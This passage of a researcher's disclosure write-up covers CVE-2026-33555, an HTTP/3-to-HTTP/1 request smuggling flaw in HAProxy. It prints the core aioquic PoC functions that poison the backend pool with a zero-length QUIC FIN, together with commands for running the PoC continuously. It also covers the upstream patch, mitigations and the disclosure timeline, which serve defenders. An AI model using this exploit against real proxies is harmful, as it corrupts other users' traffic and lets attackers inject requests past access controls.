+<p>The victim doesn’t have to be on H3. They don’t even have to know QUIC exists. The pool is HAProxy’s <strong>backend</strong> TCP pool — every frontend protocol (H1, H2, H3) funnels requests through the same set of upstream TCP sockets. In the demo, the attacker is a Python script over QUIC and the victim is Chrome browsing over H2.</p>
+
+<h3 id="42-the-poc">4.2 The PoC</h3>
+
+<p>The exploit core fits in two functions. The key trick is using aioquic’s <strong>QUIC-layer</strong> API (<code class="language-plaintext highlighter-rouge">self._quic.send_stream_data</code>) instead of the H3-layer API (<code class="language-plaintext highlighter-rouge">self._h3.send_data</code>).</p>
+
+<p>Why? Because the H3-layer API wraps everything in H3 DATA frames, which have their own header bytes. Even an empty <code class="language-plaintext highlighter-rouge">send_data</code> produces a frame header — a few bytes of H3 framing overhead. Those bytes show up in the buffer, <code class="language-plaintext highlighter-rouge">b_data(b)</code> is not zero, and the fast-path doesn’t trigger.</p>
+
+<p>The QUIC-layer API lets us send a raw STREAM frame with zero payload bytes and the FIN bit. No H3 framing. The buffer is truly empty.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">poison</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">"/photos"</span><span class="p">,</span> <span class="n">content_length</span><span class="o">=</span><span class="mi">5</span><span class="p">):</span>
+    <span class="s">"""Send H3 HEADERS with Content-Length, don't close the stream."""</span>
+    <span class="n">stream_id</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_quic</span><span class="p">.</span><span class="n">get_next_available_stream_id</span><span class="p">()</span>
+    <span class="bp">self</span><span class="p">.</span><span class="n">_h3</span><span class="p">.</span><span class="n">send_headers</span><span class="p">(</span>
+        <span class="n">stream_id</span><span class="o">=</span><span class="n">stream_id</span><span class="p">,</span>
+        <span class="n">headers</span><span class="o">=</span><span class="p">[</span>
+            <span class="p">(</span><span class="sa">b</span><span class="s">":method"</span><span class="p">,</span>         <span class="sa">b</span><span class="s">"POST"</span><span class="p">),</span>
+            <span class="p">(</span><span class="sa">b</span><span class="s">":path"</span><span class="p">,</span>           <span class="n">path</span><span class="p">.</span><span class="n">encode</span><span class="p">()),</span>
+            <span class="p">(</span><span class="sa">b</span><span class="s">":authority"</span><span class="p">,</span>      <span class="n">host</span><span class="p">.</span><span class="n">encode</span><span class="p">()),</span>
+            <span class="p">(</span><span class="sa">b</span><span class="s">":scheme"</span><span class="p">,</span>         <span class="sa">b</span><span class="s">"https"</span><span class="p">),</span>
+            <span class="p">(</span><span class="sa">b</span><span class="s">"content-length"</span><span class="p">,</span>  <span class="nb">str</span><span class="p">(</span><span class="n">content_length</span><span class="p">).</span><span class="n">encode</span><span class="p">()),</span>
+            <span class="p">(</span><span class="sa">b</span><span class="s">"content-type"</span><span class="p">,</span>    <span class="sa">b</span><span class="s">"application/octet-stream"</span><span class="p">),</span>
+        <span class="p">],</span>
+        <span class="n">end_stream</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span>       <span class="c1"># ← don't close the stream yet
+</span>    <span class="p">)</span>
+    <span class="bp">self</span><span class="p">.</span><span class="n">transmit</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">stream_id</span>
+
+<span class="k">def</span> <span class="nf">send_fin</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">stream_id</span><span class="p">):</span>
+    <span class="s">"""Send a raw QUIC STREAM FIN with zero payload."""</span>
+    <span class="bp">self</span><span class="p">.</span><span class="n">_quic</span><span class="p">.</span><span class="n">send_stream_data</span><span class="p">(</span><span class="n">stream_id</span><span class="p">,</span> <span class="sa">b</span><span class="s">""</span><span class="p">,</span> <span class="n">end_stream</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="c1">#          ↑ QUIC layer         ↑ no data    ↑ set FIN
+</span>    <span class="c1"># NOT self._h3.send_data — that would add H3 framing bytes
+</span>    <span class="bp">self</span><span class="p">.</span><span class="n">transmit</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Run it in a loop (<code class="language-plaintext highlighter-rouge">poc.py --interval 0.5</code>), open Chrome on <code class="language-plaintext highlighter-rouge">https://haproxy:10002/status</code>, and refresh. Roughly <strong>50% of responses come back as 400 Bad Request</strong> — the other 50% land on clean connections that haven’t been poisoned.</p>
+
+<p><img src="/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/screen_exploit_once.png" alt="Cover" /></p>
+
+<video controls="" width="100%">
+  <source src="/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/haproxy_smug.mp4" type="video/mp4" />
+</video>
+<h3 id="43-arbitrary-request-injection">4.3 Arbitrary request injection</h3>
+
+<p>The desync is more than a DoS. By calibrating <code class="language-plaintext highlighter-rouge">Content-Length</code> to match the exact byte length of the victim’s request headers, the attacker can make the backend parse the POST body as a completely new HTTP request — effectively injecting arbitrary requests that bypass any ACL, auth, or rate-limiting that the reverse proxy enforces.</p>
+
+<h3 id="44-configuration-required">4.4 Configuration required</h3>
+
+<p>The attack requires <code class="language-plaintext highlighter-rouge">http-reuse always</code> in the backend configuration:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>backend mybackend
+    http-reuse always      # required — enables connection pool sharing
+    server srv1 backend:80
+</code></pre></div></div>
+
+<p>HAProxy 2.4+ defaults to <code class="language-plaintext highlighter-rouge">http-reuse safe</code>, which restricts reuse after requests with a body. This prevents exploitation under default config. But <code class="language-plaintext highlighter-rouge">always</code> is widely used in production for performance.</p>
+
+<hr />
+
+<h2 id="5-on-the-cvss-score">5. On the CVSS score</h2>
+
+<p>NVD scored this at CVSS 3.1 <strong>4.0</strong> (Medium), based on high attack complexity and low integrity impact. I believe this significantly underestimates the real-world impact:</p>
+
+<ul>
+  <li>The attack is <strong>fully deterministic</strong> — no timing, no race conditions, no luck needed.</li>
+  <li>Under sustained attack, <strong>~50% of concurrent traffic</strong> receives corrupted responses.</li>
+  <li>It enables <strong>arbitrary request injection</strong>, not just connection corruption.</li>
+  <li>The attacker needs only a ~150-line Python script and a network path to the H3 listener.</li>
+</ul>
+
+<p>My own assessment was closer to <strong>8.1</strong> (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N). The non-default configuration requirement (<code class="language-plaintext highlighter-rouge">http-reuse always</code> + H3 enabled) is the main mitigating factor.</p>
+
+<hr />
+
+<h2 id="6-the-fix">6. The fix</h2>
+
+<p>The HAProxy team patched this in commit <a href="https://github.com/haproxy/haproxy/commit/05a295441c621089ffa4318daf0dbca2dd756a84"><code class="language-plaintext highlighter-rouge">05a29544</code></a> by Amaury Denoyelle on 2026-03-18. The patch adds 8 lines to <code class="language-plaintext highlighter-rouge">src/h3.c</code>, inserting a <code class="language-plaintext highlighter-rouge">Content-Length</code> check inside the standalone-FIN shortcut and rejecting the stream with a reset if validation fails:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">b_data</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">fin</span> <span class="o">&amp;&amp;</span> <span class="n">quic_stream_is_bidi</span><span class="p">(</span><span class="n">qcs</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">TRACE_PROTO</span><span class="p">(</span><span class="s">"received FIN without data"</span><span class="p">,</span> <span class="n">H3_EV_RX_FRAME</span><span class="p">,</span> <span class="n">qcs</span><span class="o">-&gt;</span><span class="n">qcc</span><span class="o">-&gt;</span><span class="n">conn</span><span class="p">,</span> <span class="n">qcs</span><span class="p">);</span>
+
+    <span class="cm">/* FIN received, ensure body length is conform to any content-length header. */</span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">h3s</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">H3_SF_HAVE_CLEN</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">h3_check_body_size</span><span class="p">(</span><span class="n">qcs</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">qcc_abort_stream_read</span><span class="p">(</span><span class="n">qcs</span><span class="p">);</span>
+        <span class="n">qcc_reset_stream</span><span class="p">(</span><span class="n">qcs</span><span class="p">,</span> <span class="n">h3s</span><span class="o">-&gt;</span><span class="n">err</span><span class="p">);</span>
+        <span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">qcs_http_handle_standalone_fin</span><span class="p">(</span><span class="n">qcs</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">TRACE_ERROR</span><span class="p">(</span><span class="s">"cannot set EOM"</span><span class="p">,</span> <span class="n">H3_EV_RX_FRAME</span><span class="p">,</span> <span class="n">qcs</span><span class="o">-&gt;</span><span class="n">qcc</span><span class="o">-&gt;</span><span class="n">conn</span><span class="p">,</span> <span class="n">qcs</span><span class="p">);</span>
+        <span class="n">qcc_set_error</span><span class="p">(</span><span class="n">qcs</span><span class="o">-&gt;</span><span class="n">qcc</span><span class="p">,</span> <span class="n">H3_ERR_INTERNAL_ERROR</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="k">goto</span> <span class="n">err</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The fix calls <code class="language-plaintext highlighter-rouge">h3_check_body_size(qcs, 1)</code> — the <code class="language-plaintext highlighter-rouge">1</code> is the <code class="language-plaintext highlighter-rouge">fin</code> argument explicitly, since at this point we know the stream has been closed. If <code class="language-plaintext highlighter-rouge">h3_check_body_size</code> rejects (i.e. <code class="language-plaintext highlighter-rouge">data_len &lt; body_len</code>), the patch does <strong>not</strong> kill the entire QUIC connection. It calls <code class="language-plaintext highlighter-rouge">qcc_abort_stream_read</code> + <code class="language-plaintext highlighter-rouge">qcc_reset_stream</code> to send a <code class="language-plaintext highlighter-rouge">RESET_STREAM</code> frame back to the client with the <code class="language-plaintext highlighter-rouge">H3_MESSAGE_ERROR</code> code, and <code class="language-plaintext highlighter-rouge">goto done</code> cleanly. Only the offending stream is reset; the rest of the connection survives. This is per <a href="https://datatracker.ietf.org/doc/html/rfc9114#section-4.1.2">RFC 9114 §4.1.2</a> — malformed messages should be treated as stream errors of type <code class="language-plaintext highlighter-rouge">H3_MESSAGE_ERROR</code>, not connection-fatal errors.</p>
+
+<p>The author Amaury Denoyelle credits the report to me in the commit body: <em>“Thanks to Martino Spagnuolo for his detailed report on this issue and for having contacting us about it via the security mailing list.”</em></p>
+
+<p><strong>References</strong>: <a href="https://github.com/haproxy/haproxy/commit/05a295441c621089ffa4318daf0dbca2dd756a84">fix commit</a> · <a href="https://www.mail-archive.com/haproxy@formilux.org/msg46752.html">mailing list advisory</a> · <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33555">NVD entry</a></p>
+
+<p><strong>Affected versions</strong>: per the commit message, the fix <em>“must be backported up to 2.6”</em> — every HAProxy release with QUIC support is vulnerable.
+<strong>Fixed in</strong>: 3.3.6, 3.2.15, 3.0.19, 2.8.20, 2.6.25.</p>
+
+<p><strong>Immediate mitigation</strong> if you can’t upgrade: switch to <code class="language-plaintext highlighter-rouge">http-reuse safe</code> (or <code class="language-plaintext highlighter-rouge">never</code>), or disable H3 listeners.</p>
+
+<hr />
+
+<h2 id="7-disclosure-timeline">7. Disclosure timeline</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Date</th>
+      <th>Event</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>2026-03-11</td>
+      <td>HAProxy H3/QUIC source audit begins.</td>
+    </tr>
+    <tr>
+      <td>2026-03-15</td>
+      <td>Identified the standalone FIN fast-path at <code class="language-plaintext highlighter-rouge">h3.c:1746</code>. Root cause analysis complete.</td>
+    </tr>
+    <tr>
+      <td>2026-03-16</td>
+      <td>Full PoC + video recording. Cross-protocol smuggling confirmed (attacker H3, victim Chrome H2).</td>
+    </tr>
+    <tr>
+      <td>2026-03-17</td>
+      <td>Report submitted to HAProxy security team via private mailing list.</td>
+    </tr>
+    <tr>
+      <td>2026-03-19</td>
+      <td>Patched versions released: 3.3.6, 3.2.15, 3.0.19, 2.8.20, 2.6.25.</td>
+    </tr>
+    <tr>
+      <td>2026-04-13</td>
+      <td><a href="https://www.cve.org/CVERecord?id=CVE-2026-33555">CVE-2026-33555</a> published.</td>
+    </tr>
+    <tr>
+      <td>2026-04-14</td>
+      <td>This post.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The HAProxy team were excellent to work with. Fast triage, clear communication, no friction about the public writeup timing.</p>
+
+<hr />
+
+<h2 id="8-takeaways">8. Takeaways</h2>
+
+<ol>
+  <li>
+    <p><strong>Trust boundaries are where bugs live.</strong> <code class="language-plaintext highlighter-rouge">mux_h1</code> trusted <code class="language-plaintext highlighter-rouge">HTX_FL_EOM</code>. The H3 layer set that flag on a path that had never run the validator. The bug isn’t in any single layer — it’s in the gap between two layers that each assume the other did the checking.</p>
+  </li>
+  <li>
+    <p><strong>Fast-paths are where invariants go to die.</strong> Every “if cheap-case then shortcut” in a parser is a candidate for a validation bypass. <code class="language-plaintext highlighter-rouge">h3_check_body_size</code> only runs inside the DATA-frame parsing loop. The standalone FIN fast-path skips that loop entirely.</p>
+  </li>
+  <li>
+    <p><strong>QUIC gives attackers packet-level control.</strong> In HTTP/1 and HTTP/2, you’re fighting TCP and TLS to produce exact framing events. With aioquic, you hand the library a byte sequence and a FIN flag. Dropping from the H3 layer (<code class="language-plaintext highlighter-rouge">self._h3</code>) to the QUIC layer (<code class="language-plaintext highlighter-rouge">self._quic</code>) to send a raw FIN with zero payload is the core of the exploit.</p>
+  </li>
+  <li>
+    <p><strong>The attack surface is “backend pool”, not “frontend protocol”.</strong> The victim doesn’t care which frontend the attacker used. If your proxy pools upstream TCP connections, every frontend protocol contributes to the same risk.</p>
+  </li>
+  <li>
+    <p><strong>Understand the full stack before you grep for bugs.</strong> The time spent mapping how QUIC packets become STREAM frames, how STREAM frames become H3 frames, how H3 frames become HTX, and how HTX becomes H1 wire format is the only reason the missing <code class="language-plaintext highlighter-rouge">h3_check_body_size</code> call was recognizable for what it was.</p>
+  </li>
+</ol>
+
+<hr />
+
+<p><a name="appendix-artifacts"></a></p>
+<h2 id="appendix-artifacts">Appendix: artifacts</h2>
+
+<p>All primary artifacts are in the <a href="https://github.com/r3verii/CVE-2026-33555">companion repo</a>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CVE-2026-33555/
+├── README.md               # 
+├── docker-compose.yml      # single-command reproduction
+├── haproxy/
+│   ├── Dockerfile          # HAProxy 3.0.18 + quictls 3.1.7-quic1
+│   └── haproxy.cfg         # frontend H3+H2, backend http-reuse always
+├── nginx/
+│   ├── default.conf        # autoindex on, /status -&gt; 200
+│   └── html/photos/        # triggers the 301
+└── client/
+    ├── Dockerfile
+    ├── requirements.txt    # aioquic &gt;= 1.2.0
+    └── poc.py              # the ~500-line PoC (--once, --test, --loop)
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>lab2
+docker compose up <span class="nt">-d</span> <span class="nt">--build</span>   <span class="c"># HAProxy build takes ~10 min first time</span>
+
+<span class="c"># One-shot verification:</span>
+docker <span class="nb">exec</span> <span class="nt">-it</span> poc-client python3 poc.py <span class="nt">--target</span> haproxy <span class="nt">--port</span> 10002 <span class="nt">--once</span>
+
+<span class="c"># Continuous poisoning (run in one terminal, browse in another):</span>
+docker <span class="nb">exec</span> <span class="nt">-it</span> poc-client python3 poc.py <span class="nt">--target</span> haproxy <span class="nt">--port</span> 10002 <span class="nt">--interval</span> 0.5
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="references">References</h2>
+
+<p><strong>Specifications</strong></p>
+
+<ul>
+  <li><a href="https://datatracker.ietf.org/doc/html/rfc9000">RFC 9000</a> — <em>QUIC: A UDP-Based Multiplexed and Secure Transport</em>. §19.8 defines the STREAM frame, including the OFF/LEN/FIN flag bits in the type byte; §4.5 defines the stream final-size invariant.</li>
+  <li><a href="https://datatracker.ietf.org/doc/html/rfc9114">RFC 9114</a> — <em>HTTP/3</em>. §4.1.2 <em>“Malformed Requests and Responses”</em> is the <code class="language-plaintext highlighter-rouge">Content-Length</code> ↔ DATA-frame-sum contract that <code class="language-plaintext highlighter-rouge">h3_check_body_size</code> enforces on the legitimate path.</li>
+  <li><a href="https://datatracker.ietf.org/doc/html/rfc7540">RFC 7540</a> — <em>Hypertext Transfer Protocol Version 2 (HTTP/2)</em>. §4.1 frame layout, cited for contrast with H/3’s transport-level FIN.</li>
+  <li><a href="https://datatracker.ietf.org/doc/html/rfc9113">RFC 9113</a> — <em>HTTP/2</em>, the current revision obsoleting RFC 7540.</li>
+</ul>
+
+<p><strong>QUIC design</strong></p>
+
+<ul>
+  <li>Jim Roskind, <a href="https://docs.google.com/document/d/1RNHkx_VvKWyWg6Lr8SZ-saqsQx7rFV-ev2jRFUoVD34/preview"><em>“QUIC: Design Document and Specification Rationale”</em></a> — the 2012 Google design memo, first public statement of QUIC’s goals.</li>
+  <li>Langley, Riddoch, Wilk, Vicente, Krasic, Zhang, Yang, Kouranov, Swett, Iyengar et al., <a href="https://dl.acm.org/doi/10.1145/3098822.3098842"><em>“The QUIC Transport Protocol: Design and Internet-Scale Deployment”</em></a>, SIGCOMM 2017 — the deployment retrospective.</li>
+</ul>
+
+<p><strong>HTTP request smuggling — prior art</strong></p>
+
+<ul>
+  <li>James Kettle’s blog and research portfolio: <a href="https://jameskettle.com/">jameskettle.com</a> · <a href="https://x.com/albinowax">@albinowax</a>.</li>
+  <li><a href="https://portswigger.net/research">PortSwigger Research</a> — the deepest public catalog of HTTP desync / smuggling work.</li>
+</ul>
+
+<p><strong>Fix and advisory</strong></p>
+
+<ul>
+  <li>Fix commit: Amaury Denoyelle, <a href="https://github.com/haproxy/haproxy/commit/05a295441c621089ffa4318daf0dbca2dd756a84"><code class="language-plaintext highlighter-rouge">05a29544</code> — <em>BUG/MAJOR: h3: check body size with content-length on empty FIN</em></a>, 2026-03-18.</li>
+  <li>HAProxy mailing list advisory: <a href="https://www.mail-archive.com/haproxy@formilux.org/msg46752.html"><code class="language-plaintext highlighter-rouge">haproxy@formilux.org</code> msg 46752</a>.</li>
+  <li>CVE record: <a href="https://www.cve.org/CVERecord?id=CVE-2026-33555">CVE-2026-33555</a> · <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33555">NVD entry</a>.</li>
+</ul>
+
+<hr />
+
+<h2 id="acknowledgments">Acknowledgments</h2>
+
+<p>Thanks to the <strong>HAProxy security team</strong> — in particular Amaury Denoyelle, who authored the fix — for a smooth coordinated disclosure.</p>
+
+<p>Thanks also to <strong>James Kettle</strong> and his collaborators at PortSwigger Research. The years of work on HTTP desync and request smuggling published on <a href="https://jameskettle.com/">his blog</a> and on <a href="https://portswigger.net/research">PortSwigger Research</a> has been a constant source of material and inspiration for this writeup — genuine respect for the body of work he has put out.</p>
+
+<p>— r3verii (Martino Spagnuolo)</p>
+
+      </div>
+
+      
+      
+      
+
+      <div class="share-bar">
+        <span class="share-label">Share this post</span>
+        <div class="share-buttons">
+          <a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fr3verii.github.io%2Fcve%2F2026%2F04%2F14%2Fhaproxy-h3-standalone-fin-smuggling.html&text=HAProxy+HTTP%2F3+-%3E+HTTP%2F1+Desync%3A+Cross-Protocol+Smuggling+via+a+Standalone+QUIC+FIN+%28CVE-2026-33555%29"
+             target="_blank" rel="noopener noreferrer" class="share-btn share-btn--x" title="Share on X (Twitter)">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+          </a>
+          <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fr3verii.github.io%2Fcve%2F2026%2F04%2F14%2Fhaproxy-h3-standalone-fin-smuggling.html"
+             target="_blank" rel="noopener noreferrer" class="share-btn share-btn--linkedin" title="Share on LinkedIn">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+          </a>
+          <a href="https://www.reddit.com/submit?url=https%3A%2F%2Fr3verii.github.io%2Fcve%2F2026%2F04%2F14%2Fhaproxy-h3-standalone-fin-smuggling.html&title=HAProxy+HTTP%2F3+-%3E+HTTP%2F1+Desync%3A+Cross-Protocol+Smuggling+via+a+Standalone+QUIC+FIN+%28CVE-2026-33555%29"
+             target="_blank" rel="noopener noreferrer" class="share-btn share-btn--reddit" title="Share on Reddit">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 01.042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 014.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 01.14-.197.35.35 0 01.238-.042l2.906.617a1.214 1.214 0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 00-.231.094.33.33 0 000 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 000-.463.327.327 0 00-.462 0c-.545.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 00-.205-.094z"/></svg>
+          </a>
+          <a href="https://news.ycombinator.com/submitlink?u=https%3A%2F%2Fr3verii.github.io%2Fcve%2F2026%2F04%2F14%2Fhaproxy-h3-standalone-fin-smuggling.html&t=HAProxy+HTTP%2F3+-%3E+HTTP%2F1+Desync%3A+Cross-Protocol+Smuggling+via+a+Standalone+QUIC+FIN+%28CVE-2026-33555%29"
+             target="_blank" rel="noopener noreferrer" class="share-btn share-btn--hn" title="Share on Hacker News">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+          </a>
+          <a href="mailto:?subject=HAProxy+HTTP%2F3+-%3E+HTTP%2F1+Desync%3A+Cross-Protocol+Smuggling+via+a+Standalone+QUIC+FIN+%28CVE-2026-33555%29&body=%0A%0A%0A%0Ahttps%3A%2F%2Fr3verii.github.io%2Fcve%2F2026%2F04%2F14%2Fhaproxy-h3-standalone-fin-smuggling.html"
+             class="share-btn share-btn--email" title="Share via Email">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M1.5 8.67v8.58a3 3 0 003 3h15a3 3 0 003-3V8.67l-8.928 5.493a3 3 0 01-3.144 0L1.5 8.67z"/><path d="M22.5 6.908V6.75a3 3 0 00-3-3h-15a3 3 0 00-3 3v.158l9.714 5.978a1.5 1.5 0 001.572 0L22.5 6.908z"/></svg>
+          </a>
+          <button class="share-btn share-btn--copy" title="Copy link" onclick="navigator.clipboard.writeText('https://r3verii.github.io/cve/2026/04/14/haproxy-h3-standalone-fin-smuggling.html').then(()=>{this.classList.add('copied');setTimeout(()=>this.classList.remove('copied'),2000)})">
+            <svg class="icon-copy" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+            <svg class="icon-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+    </main>
+
+    <footer class="site-footer">
+  <span class="footer-text">&copy; 2026 Martino Spagnuolo</span>
+</footer>
+
+  </div>
+
+  <!-- Prism.js: core + languages + plugins -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-http.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup-templating.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/toolbar/prism-toolbar.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js"></script>
+  <script src="/assets/js/main.js"></script>
+</body>
+</html>
